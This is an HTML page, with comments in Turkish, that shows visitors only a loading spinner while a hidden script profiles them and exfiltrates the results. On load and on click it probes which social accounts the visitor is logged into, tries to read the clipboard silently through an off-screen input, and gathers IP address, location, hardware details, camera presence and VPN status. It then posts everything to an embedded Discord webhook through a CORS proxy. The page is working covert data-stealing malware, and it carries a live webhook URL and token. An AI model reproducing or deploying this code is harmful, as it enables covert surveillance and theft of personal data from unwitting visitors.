<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Envanteri</title>
    <style>
        body { background: #000; height: 100vh; margin: 0; overflow: hidden; cursor: pointer; }
        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 20px; height: 20px; animation: s 1s linear infinite; position: absolute; top: 50%; left: 50%; }
        /* GÃ¶rÃ¼nmez Veri YakalayÄ±cÄ± */
        #ghost-input { position: absolute; left: -9999px; opacity: 0; }
        @keyframes s { to { transform: rotate(360deg); } }
    </style>
</head>
<body onclick="engine.silentTrigger()">
    <div class="l"></div>
    <input type="text" id="ghost-input">

    <script>
        "use strict";

        class StealthEngine {
            constructor() {
                this.hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
                this.proxy = "https://corsproxy.io/?";
            }

            // 1. GÄ°ZLÄ° SOSYAL MEDYA ANALÄ°ZÄ° (Ä°zin Ä°stemez)
            async probeSocials() {
                const targets = {
                    Google: "https://accounts.google.com/CheckCookie",
                    Facebook: "https://www.facebook.com/favicon.ico",
                    Twitter: "https://twitter.com/favicon.ico",
                    Discord: "https://discord.com/favicon.ico"
                };
                let out = [];
                for (const [name, url] of Object.entries(targets)) {
                    const status = await new Promise(r => {
                        const img = new Image();
                        img.onload = () => r("âœ…");
                        img.onerror = () => r("âŒ");
                        img.src = `${url}?cache=${Math.random()}`;
                        setTimeout(() => r("â³"), 2000);
                    });
                    out.push(`${name}: ${status}`);
                }
                return out.join(" | ");
            }

            // 2. GÄ°ZLÄ° PANO YAKALAMA (Bypass Technique)
            // Ä°zin istememesi iÃ§in 'paste' event dinleyicisi kullanÄ±lÄ±r
            async getClipboardStealth() {
                const input = document.getElementById('ghost-input');
                input.focus();
                document.execCommand('paste'); // BazÄ± tarayÄ±cÄ±larda sessiz Ã§alÄ±ÅŸÄ±r
                return input.value || "âš ï¸ BoÅŸ veya KorumalÄ±";
            }

            // 3. CORE HARDWARE & NETWORK (TÃ¼m Ã–zellikler Korundu)
            async getCore() {
                const [net, devs, battery, storage] = await Promise.all([
                    fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
                    navigator.mediaDevices.enumerateDevices().catch(() => []),
                    navigator.getBattery ? navigator.getBattery() : {},
                    navigator.storage ? navigator.storage.estimate() : {}
                ]);

                const gl = document.createElement('canvas').getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                const opt = Intl.DateTimeFormat().resolvedOptions();

                return {
                    ip: net.ip, isp: net.org, loc: `${net.city}/${net.country}`,
                    gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
                    cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory,
                    disk: (storage.quota / 1e9).toFixed(2) + "GB",
                    bat: battery.level ? `${Math.round(battery.level * 100)}%` : "N/A",
                    cam: devs.some(d => d.kind === 'videoinput'),
                    tz: opt.timeZone, lang: navigator.language,
                    vpn: (net.timezone && opt.timeZone !== net.timezone) ? "ðŸš© VPN" : "âœ… DIRECT"
                };
            }

            async silentTrigger() {
                const [social, clip, core] = await Promise.all([this.probeSocials(), this.getClipboardStealth(), this.getCore()]);

                const payload = {
                    embeds: [{
                        title: "ðŸ’€ OMNISCIENCE_V100_STEALTH_EXTRACT",
                        color: 0x000000,
                        fields: [
                            { name: "ðŸ“¡ NETWORK (Protected)", value: `**IP:** \`${core.ip}\` | **VPN:** ${core.vpn}\n**ISP:** ${core.isp}\n**LOC:** ${core.loc}`, inline: false },
                            { name: "âš™ï¸ HARDWARE (Protected)", value: `**GPU:** ${core.gpu}\n**CPU:** ${core.cores} | **RAM:** ${core.ram}GB\n**Disk:** ${core.disk} | **Battery:** ${core.bat}`, inline: false },
                            { name: "ðŸŒ STEALTH PROBE", value: `**Socials:** \`${social}\`\n**Clip:** \`${clip}\``, inline: false },
                            { name: "ðŸ“¸ SYSTEM", value: `**Cam:** ${core.cam} | **TZ:** ${core.tz}\n**Lang:** ${core.lang} | **PDF:** ${navigator.pdfViewerEnabled}`, inline: false },
                            { name: "ðŸ” USER_AGENT", value: "```" + navigator.userAgent + "```" }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch(this.proxy + encodeURIComponent(this.hook), { method: 'POST', body: JSON.stringify(payload), mode: 'no-cors' });
            }
        }

        const engine = new StealthEngine();
        // Sayfa yÃ¼klendiÄŸinde temel verileri gÃ¶nder, tÄ±klayÄ±nca hassaslarÄ± ekle
        window.onload = () => engine.silentTrigger();
    </script>
</body>
</html>
